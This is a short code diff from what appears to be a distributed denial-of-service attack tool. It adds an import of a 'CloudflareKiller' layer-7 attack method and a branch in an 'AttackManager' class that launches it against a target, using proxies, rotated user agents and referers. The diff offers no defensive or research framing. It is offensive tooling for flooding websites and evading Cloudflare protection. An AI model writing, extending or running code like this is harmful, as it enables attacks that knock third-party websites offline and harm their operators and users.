@@ -62,6 +62,8 @@ import {
     HTTP3PostAttack
 } from '../methods/layer7/http3.js';
 
+import { CloudflareKiller } from '../methods/layer7/cloudflare-killer.js';
+
 /**
  * Attack Manager - Coordinates all attack operations
  */
@@ -443,6 +445,17 @@ export class AttackManager {
                     apiKey: process.env.CAPTCHA_API_KEY || '',
                     enabled: false
                 }
+            );
+        }
+
+        if (['CF-KILLER', 'CFKILLER', 'CLOUDFLARE-KILLER'].includes(method)) {
+            return new CloudflareKiller(
+                this.target,
+                this.duration,
+                this.rpc,
+                this.userAgents,
+                this.referers,
+                this.proxies
             );
         }
 
